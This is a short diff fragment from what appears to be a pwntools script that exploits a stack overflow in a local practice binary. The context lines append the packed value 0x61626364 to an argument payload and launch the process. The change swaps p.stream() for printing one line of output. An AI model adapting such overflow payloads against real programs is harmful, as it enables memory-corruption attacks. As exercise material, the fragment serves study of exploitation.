@@ -15,5 +15,5 @@ payload += p32(0x61626364)
 
 p = e.process([payload])
 
-p.stream()
+print(p.recvlineS())
 
